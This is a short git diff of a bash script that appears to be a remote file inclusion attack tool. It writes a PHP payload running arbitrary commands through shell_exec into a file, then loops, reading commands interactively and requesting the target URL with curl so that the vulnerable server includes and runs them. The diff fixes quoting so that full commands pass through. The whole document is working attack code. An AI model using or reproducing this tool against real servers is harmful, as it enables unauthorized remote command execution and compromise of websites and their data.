@@ -1,7 +1,7 @@
 #!/bin/bash
 
 function rfi_template {
-	echo "<pre><?php echo exec("$1");?></pre>" > $2
+	echo "<?php print shell_exec(\"${1}\");?>" > ${2}
 }
 
 function usage {
@@ -44,9 +44,10 @@ if [[ ! -z $rfifile ]]; then
 	while :; do 
 		printf "[rfi>] "
 		read cmd
-		rfi_template $cmd $rfifile
+		rfi_template "${cmd}" ${rfifile}
 		echo "[+] requesting ${url}${prefix}${suffix}"
 		curl "${url}${prefix}${suffix}"
 		echo ""
 	done
 fi
+
